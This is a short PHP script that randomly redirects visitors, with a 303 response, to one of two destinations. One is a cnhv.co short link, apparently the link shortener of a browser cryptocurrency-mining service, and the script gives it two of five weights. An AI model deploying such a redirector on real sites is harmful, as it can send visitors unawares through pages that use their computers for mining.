   <?php
    $addresses = [
      'https://cnhv.co/3w5s6',
      'https://cnhv.co/3w5s6',
      'http://www.frie.me',
      'http://www.frie.me',
      'http://www.frie.me',
    ];
    $size = count($addresses);
    $randomIndex = rand(0, $size - 1);
    $randomUrl = $addresses[$randomIndex];
    header('Location: ' . $randomUrl, true, 303);
    
